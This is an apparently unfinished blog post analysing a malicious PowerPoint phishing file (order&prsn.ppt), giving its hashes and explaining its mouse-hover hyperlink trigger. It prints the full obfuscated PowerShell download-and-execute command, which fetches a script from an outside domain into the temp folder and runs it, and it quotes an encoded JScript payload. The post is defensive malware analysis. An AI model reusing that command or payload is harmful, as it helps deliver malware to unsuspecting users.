+++
title = "Analysis of the order&prsn.ppt malicious powerpoint"
date = 2024-03-11T20:03:02+02:00
draft = true
tags = ["order&prsn.ppt","maldocs","ppt"]
categories = ["Phishing","Malicious_documents"]
ShowToc = true
author = ["connar"]
+++

## Analysis of the order&prsn.ppt document
This post will be for the analysis of a malicious ppt document better known as order.ppt or prsn.ppt. General info about this document:
- MD5: 3bff3e4fec2b6030c89e792c05f049fc
- SHA256: 796a386b43f12b99568f55166e339fcf43a4792d292bdd05dafa97ee32518921

## Techniques used in the document
This document used an onhoven action on a link inside the document to try and invoke a powershell command. Afterwards, it ... 


### Powershell command
Initially, the first command used is the following powershell command which gets triggered upon hoverup on the hyperlink:  
![powershell command](/posts/malicious_ppt_1/powershell_command.png)
The command is:
```ps
powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('http:'+[char] 0x2F+[char] 0x2F+'cccn.nl'+[char] 0x2F+'c.php',\"$env:temp\ii.jse\"); Invoke-Item \"$env:temp\ii.jse\""
```

We can further deobfuscate this command using engines like [tio.run](https://tio.run/):  
![tio.run](/posts/malicious_ppt_1/tioRun_powershell.png)  

So this command tries to:  
- download a file named "c.php" from h[x][x]p://cccn.nl/c.php
- outputs the contents of this file to the temp directory and specifically to a file named ii.jse

Unfortunately, the domain does not exist anymore to be able to download the ii.jse for further analysis. But to my luck, I could find the contents of it in [Hybrid Analysis strings part](https://www.hybrid-analysis.com/sample/55821b2be825629d6674884d93006440d131f77bed216d36ea20e4930a280302?environmentId=100):
```jse
#@~ ^ jh0FAA == dm3rRHmD / 2, {;x9 + Wk + [Ikl3b00KD: \x7f.\l0k o1Fx;Nn0bU + 9 idC0k % 324 + dEkqZ '; N\x7f0k +9I/m3r%Str^4GF{;x9+0bUnNp/m3r%.n7knh:4+l*x; N+Wr +[ikC0k0(DKkVk&WxE Nn0bxn[p/l0r%1WxDUO/:tmxq';U9 + Wk nNp / CVb % ors9 + [, Rx!x[\x7f0 bx + 9 ikC3b % nlMY4\x7f 2 'E [+6kx\x7f[I/m3b%nl.O4vf'!UN\x7f 0 rU\x7f NidC0k0Y4n\x7f Ff { E N + 6 k nNp / C3b % 5;bm32T '!xN\x7fWrx\x7fNp/C3r0Dkh+lq'!x[n6kxn[p / C3b04W;M &amp;U9 + Wk n9idm3b % /DDKUol!xE NnWbx+9I/m 3 kRhGD\x7f 2 ';x[n6kU+9I/m3r04+k.dtlzv2x!x[\x7f0bx+9ikC3b%Ot\x7fx+q{Ex9n0bx+9Idl0kRw.kU^\x7f/**{;x9+Wr +NIdm3r%MCM+jbx1+*F'!UN\x7f 0 rx\x7f NI - mDPkC3b % tm - nKKo\x7f Y4 + .*R '`/D1l=0;U1YkGUvl8+MOByS ~s# M+D;D PjYMkUL]J0MG:;tlMEQJ;Wr_EJQE9+ETvc_EFqqE#_Xb)~.+7r\x7f*lEFy&B)$EdYOlvTv0;U1YkKU`* D\x7fO;D PDD;+INB!S!Bq#3 hCM4V0C=0;x1ObWUvl(+DD~.SxB:b M+O;MxPUODbxo]EWDK:;tCDEQrZGJ3EJ3J[nrT`cQEFT,Eb3*b)~kYE9kRlBO*v8]BhCM4VRCBY`0!U^YbW `b .nDE.x,OD!+INB!~TS8#Q snDl1m)6Ex1YbGxvl8+MYS"Bx~sb M+Y!.UPUYMkUo,E6DG:;4lMJQE;WJQEr_EN\x7fEY`c3BO B*_lb8B4.kTvlv8!&EN$E:+
```


**References**
<blockquote>
    <ul>
        <li> [1] <a href="https://www.youtube.com/watch?v=72Ztp7NNWqc">cybercdh: <i>Malicious Powerpoint and .jse behavioural and code analysis</i></a></li>
        <li> [2] <a href="https://www.virustotal.com/gui/file/796a386b43f12b99568f55166e339fcf43a4792d292bdd05dafa97ee32518921">VirusTotal: <i>order&prsn.ppsx</i></a></li>
    </ul>
</blockquote>